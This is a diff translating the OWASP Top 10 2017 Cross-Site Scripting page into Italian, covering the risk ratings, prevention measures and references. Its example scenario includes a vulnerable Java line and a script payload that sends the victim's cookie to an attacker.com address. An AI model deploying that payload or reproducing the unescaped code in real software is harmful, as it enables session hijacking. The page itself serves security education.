@@ -1,11 +1,11 @@
 # A7:2017 Cross-Site Scripting (XSS)
 
-| Threat agents/Attack vectors | Security Weakness           | Impacts               |
+| Agenti di Minaccia/Vettori di Attacco | Problematiche di Sicurezza           | Impatti               |
 | -- | -- | -- |
-| Access Lvl : Exploitability 3 | Prevalence 3 : Detectability 3 | Technical 2 : Business |
+| Access Lvl : Sfruttabilità 3 | Diffusione 3 : Individuazione 3 | Tecnici 2 : Business |
 | Automated tools can detect and exploit all three forms of XSS, and there are freely available exploitation frameworks. | XSS is the second most prevalent issue in the OWASP Top 10, and is found in around two thirds of all applications. Automated tools can find some XSS problems automatically, particularly in mature technologies such as PHP, J2EE / JSP, and ASP.NET. | The impact of XSS is moderate for reflected and DOM XSS, and severe for stored XSS, with remote code execution on the victim's browser, such as stealing credentials, sessions, or delivering malware to the victim. |
 
-## Is the Application Vulnerable?
+## L'applicazione è vulnerabile?
 
 There are three forms of XSS, usually targeting users' browsers:
 
@@ -15,7 +15,7 @@ There are three forms of XSS, usually targeting users' browsers:
 
 Typical XSS attacks include session stealing, account takeover, MFA bypass, DOM node replacement or defacement (such as trojan login panels), attacks against the user's browser such as malicious software downloads, key logging, and other client-side attacks.
 
-## How To Prevent
+## Come prevenire?
 
 Preventing XSS requires separation of untrusted data from active browser content. This can be achieved by:
 
@@ -24,20 +24,20 @@ Preventing XSS requires separation of untrusted data from active browser content
 * Applying context-sensitive encoding when modifying the browser document on the client side acts against DOM XSS. When this cannot be avoided, similar context sensitive escaping techniques can be applied to browser APIs as described in the OWASP Cheat Sheet 'DOM based XSS Prevention'.
 * Enabling a [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) as a defense-in-depth mitigating control against XSS. It is effective if no other vulnerabilities exist that would allow placing malicious code via local file includes (e.g. path traversal overwrites or vulnerable libraries from permitted content delivery networks).
 
-## Example Attack Scenario
+## Esempi di Scenari di Attacco
 
-**Scenario #1**: The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:
+**Scenario #1**: L’applicazione in esame usa dati non controllati per costruire i seguenti snippet HTML, senza effettuare la validazione o l’escaping:
 
 `(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
-The attacker modifies the ‘CC’ parameter in the browser to:
+L’attaccante modifica il parametro 'CC' nel suo browser con:
 
 `'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`
 
-This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.
+Questo fa sì che l'ID della sessione della vittima venga inviato al sito web dell'attaccante, consentendo a quest'ultimo di dirottare la sessione corrente dell'utente.
 
-**Note**: Attackers can use XSS to defeat any automated Cross-Site Request Forgery (CSRF) defense the application might employ.
+**Nota**: Gli attaccanti possono utilizzare XSS per aggirare qualsiasi difesa automatizzata contro il Cross-Site Request Forgery ( CSRF) che l'applicazione potrebbe impiegare.
 
-## References
+## Riferimenti
 
 ### OWASP
 
@@ -52,7 +52,7 @@ This attack causes the victim’s session ID to be sent to the attacker’s webs
 * [OWASP Cheat Sheet: XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
 * [OWASP Java Encoder Project](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project)
 
-### External
+### Esterni
 
 * [CWE-79: Improper neutralization of user supplied input](https://cwe.mitre.org/data/definitions/79.html)
 * [PortSwigger: Client-side template injection](https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection)
